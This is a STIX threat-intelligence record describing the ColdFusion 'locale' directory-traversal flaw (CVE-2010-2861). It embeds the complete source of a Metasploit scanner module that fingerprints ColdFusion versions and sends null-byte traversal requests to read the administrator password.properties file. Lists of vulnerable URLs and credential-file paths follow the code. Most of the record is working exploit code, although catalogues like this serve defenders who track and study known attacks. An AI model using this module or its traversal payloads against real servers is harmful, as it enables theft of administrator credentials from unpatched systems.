{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f64b4ff1-5a06-4d8a-8e41-b30edf6c9c14",
    "created": "2024-08-14T16:28:33.775846Z",
    "modified": "2024-08-14T16:28:33.77585Z",
    "name": "ColdFusion Server Check",
    "description": " This module attempts to exploit the directory traversal in the 'locale' attribute.  According to the advisory the following versions are vulnerable:  ColdFusion MX6 6.1 base patches ColdFusion MX7 7,0,0,91690 base patches ColdFusion MX8 8,0,1,195765 base patches ColdFusion MX8 8,0,1,195765 with Hotfix4.  Adobe released patches for ColdFusion 8.0, 8.0.1, and 9 but ColdFusion 9 is reported to have directory traversal protections in place, subsequently this module does NOT work against ColdFusion 9.  Adobe did not release patches for ColdFusion 6.1 or ColdFusion 7.  It is not recommended to set FILE when doing scans across a group of servers where the OS may vary; otherwise, the file requested may not make sense for the OS  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/coldfusion_locale_traversal.rb",
            "external_id": "coldfusion_locale_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2861"
        },
        {
            "source_name": "reference",
            "url": "https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/"
        },
        {
            "source_name": "reference",
            "url": "https://www.adobe.com/support/security/bulletins/apsb10-18.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'ColdFusion Server Check',\n      'Description' => %q{\n          This module attempts to exploit the directory traversal in the 'locale'\n        attribute.  According to the advisory the following versions are vulnerable:\n\n        ColdFusion MX6 6.1 base patches,\n        ColdFusion MX7 7,0,0,91690 base patches,\n        ColdFusion MX8 8,0,1,195765 base patches,\n        ColdFusion MX8 8,0,1,195765 with Hotfix4.\n\n        Adobe released patches for ColdFusion 8.0, 8.0.1, and 9 but ColdFusion 9 is reported\n        to have directory traversal protections in place, subsequently this module does NOT\n        work against ColdFusion 9.  Adobe did not release patches for ColdFusion 6.1 or\n        ColdFusion 7.\n\n        It is not recommended to set FILE when doing scans across a group of servers where the OS\n        may vary; otherwise, the file requested may not make sense for the OS\n\n      },\n      'Author'      => [ 'CG', 'nebulus' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2010-2861' ],\n          [ 'BID', '42342' ],\n          [ 'OSVDB', '67047' ],\n          [ 'URL', 'https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/' ],\n          [ 'URL', 'https://www.adobe.com/support/security/bulletins/apsb10-18.html' ],\n        ]\n    )\n\n    register_options(\n      [\n        OptString.new('FILE', [ false,  'File to retrieve', '']),\n        OptBool.new('FINGERPRINT', [true, 'Only fingerprint endpoints', false])\n      ])\n  end\n\n  def fingerprint(response)\n\n    if(response.headers.has_key?('Server') )\n      if(response.headers['Server'] =~ /IIS/ or response.headers['Server'] =~ /\\(Windows/)\n        os = \"Windows (#{response.headers['Server']})\"\n      elsif(response.headers['Server'] =~ /Apache\\//)\n          os = \"Unix (#{response.headers['Server']})\"\n      else\n        os = response.headers['Server']\n      end\n    end\n\n    return nil if response.body.length < 100\n\n    title = \"Not Found\"\n    response.body.gsub!(/[\\r\\n]/, '')\n    if(response.body =~ /<title.*\\/?>(.+)<\\/title\\/?>/i)\n      title = $1\n      title.gsub!(/\\s/, '')\n    end\n    return nil  if( title == 'Not Found' or not title =~ /ColdFusionAdministrator/)\n\n    out = nil\n\n    if(response.body =~ />\\s*Version:\\s*(.*)<\\/strong\\><br\\s\\//)\n      v = $1\n      out = (v =~ /^6/) ? \"Adobe ColdFusion MX6 #{v}\" : \"Adobe ColdFusion MX7 #{v}\"\n    elsif(response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright 1995-2012 Adobe/ and response.body =~ /Administrator requires a browser that supports frames/ )\n      out = \"Adobe ColdFusion MX7\"\n    elsif(response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright \\(c\\) 1995-2006 Adobe/)\n      out = \"Adobe ColdFusion 8\"\n    elsif(response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright \\(c\\) 1995-2010 Adobe/ or\n      response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright \\(c\\) 1995\\-2009 Adobe Systems\\, Inc\\. All rights reserved/)\n      out = \"Adobe ColdFusion 9\"\n    elsif(response.body =~ /<meta name=\\\"Keywords\\\" content=\\\"(.*)\\\">\\s+<meta name/)\n      out = $1.split(/,/)[0]\n    else\n      out = 'Unknown ColdFusion'\n    end\n\n    if(title.downcase == 'coldfusionadministrator')\n      out << \" (administrator access)\"\n    end\n\n    out << \" (#{os})\"\n    return out\n  end\n\n  def run_host(ip)\n    trav = datastore['FILE']\n\n    if(trav == '' or datastore['FINGERPINT'])\n    # the user did not specify what they wanted, fingerprint, go after password.properties\n\n      url = '/CFIDE/administrator/index.cfm'\n\n      res = send_request_cgi({\n          'uri' => url,\n          'method' => 'GET',\n          'Connection' => \"keep-alive\",\n          'Accept-Encoding' => \"zip,deflate\",\n          })\n\n      return if not res or not res.body or not res.code\n\n      if (res.code.to_i == 200)\n        out = fingerprint(res)\n        print_status(\"#{ip} #{out}\") if out\n        return if (datastore['FINGERPRINT'])\n\n        if(out =~ /Windows/ and out =~ /MX6/)\n          trav = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties%00en'\n        elsif(out =~ /Windows/ and out =~ /MX7/)\n          trav = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties%00en'\n        elsif(out =~ /Windows/ and out =~ /ColdFusion 8/)\n          trav = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties%00en'\n        elsif(out =~ /ColdFusion 9/)\n          print_status(\"#{ip} ColdFusion 9 is not vulnerable, skipping\")\n          return\n        elsif(out =~ /Unix/ and out =~ /MX6/)\n          trav = '../../../../../../../../../../opt/coldfusionmx/lib/password.properties%00en'\n        elsif(out =~ /Unix/ and out =~ /MX7/)\n          trav = '../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en'\n        elsif(out =~ /Unix/ and out =~ /ColdFusion 8/)\n          trav = '../../../../../../../../../../opt/coldfusion8/lib/password.properties%00en'\n        else\n          if(res.body =~ /Adobe/ and res.body =~ /ColdFusion/)\n            print_error(\"#{ip} Fingerprint failed, FILE not set...aborting\")\n          else\n            return\t\t# probably just a web server\n          end\n        end\n      else\n        return \t\t\t\t# silent fail as it doesnt necessarily at this point have to be a CF server\n      end\n    end\n\n    # file specified or obtained via fingerprint\n    if(trav !~ /\\.\\.\\/\\.\\.\\// and trav !~ /\\.\\.\\\\\\.\\.\\\\/)\n      # file probably specified by user, make sure to add in actual traversal\n      trav = '../../../../../../../../../../' << trav << '%00en'\n    end\n\n    locale = \"?locale=\"\n\n    urls = [\"/CFIDE/administrator/enter.cfm\", \"/CFIDE/wizards/common/_logintowizard.cfm\", \"/CFIDE/administrator/archives/index.cfm\",\n      \"/CFIDE/administrator/entman/index.cfm\", \"/CFIDE/administrator/logging/settings.cfm\"]\n    # \"/CFIDE/install.cfm\",  haven't seen where this one works\n\n    out = ''\t\t\t\t\t\t\t# to keep output in synch with threads\n    urls.each do |url|\n      res = send_request_raw({\n        'uri'     => url+locale+trav,\n        'method'  => 'GET',\n        'headers' =>\n          {\n            'Connection' => \"keep-alive\",\n            'Accept-Encoding' => \"zip,deflate\",\n          },\n        })\n\n\n      if (res.nil?)\n        print_error(\"no response for #{ip}:#{rport} #{url}\")\n      elsif (res.code == 200)\n        #print_error(\"#{res.body}\")#debug\n        print_status(\"URL: #{ip}#{url}#{locale}#{trav}\")\n        if res.body.match(/\\<title\\>(.*)\\<\\/title\\>/im)\n          fileout = $1\n          if(fileout !~ /Login$/ and fileout !~ /^Welcome to ColdFusion/ and fileout !~ /^Archives and Deployment/)\n            print_good(\"#{ip} FILE: #{fileout}\")\n            break\n          end\n        end\n      else\n        next if (res.code == 500 or res.code == 404 or res.code == 302)\n        print_error(\"#{ip} #{res.to_s}\")\n      end\n    end\n\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::ArgumentError\n  rescue ::Timeout::Error, ::Errno::EPIPE\n  end\nend\n\n# URLs that may work for you:\n#\"/CFIDE/administrator/enter.cfm\",\n#\"/CFIDE/wizards/common/_logintowizard.cfm\",\n#\"/CFIDE/administrator/archives/index.cfm\",\n#\"/CFIDE/install.cfm\",\n#\"/CFIDE/administrator/entman/index.cfm\",\n#\"/CFIDE/administrator/logging/settings.cfm\",\n\n# Files to grab\n#../../../../../../../../../../ColdFusion8/lib/password.properties%00en\n#../../../../../../../../../../CFusionMX7/lib/password.properties%00en\n#../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en\n"
}